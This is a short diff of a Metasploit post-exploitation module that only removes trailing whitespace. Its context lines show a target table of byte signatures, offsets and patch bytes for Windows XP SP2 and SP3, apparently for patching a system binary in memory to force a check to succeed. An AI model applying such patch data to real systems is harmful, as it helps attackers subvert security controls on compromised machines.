@@ -55,7 +55,7 @@ class Metasploit3 < Msf::Post
 	def run
 
 		revert = datastore['REVERT']
-		
+
 		targets = [
 			{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x9927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x99cc, :os => /Windows XP.*Service Pack 2/ },
 			{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x98c0, :os => /Windows XP.*Service Pack 3/ },
